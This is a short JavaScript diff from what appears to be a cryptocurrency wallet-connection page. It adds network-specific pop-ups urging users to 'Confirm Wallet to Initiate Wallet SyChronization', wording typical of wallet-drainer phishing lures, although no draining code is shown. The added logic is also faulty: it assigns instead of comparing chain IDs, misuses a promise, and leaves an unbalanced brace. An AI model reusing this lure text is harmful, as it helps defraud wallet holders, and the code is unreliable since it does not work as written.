@@ -172,7 +172,11 @@ async function fetchAccountData() {
   document.getElementById("bsc").style.display = "";
   web3.eth.net.getId().then(console.log);
  var chainid =web3.eth.net.getId();
-  alert("You are on the Ethereum Network, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");
+  if(chainid = 1){
+  alert("You are on the Ethereum Network, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");}
+  else if(chainid = 137){
+  alert("You are on the Polygon(Matic) Network, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");}
+ else{alert("You are on the Binance Smart Chain Network, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");}}
   document.querySelector("#prepare").style.display = "none";
   document.querySelector("#connected").style.display = "block"; 
  
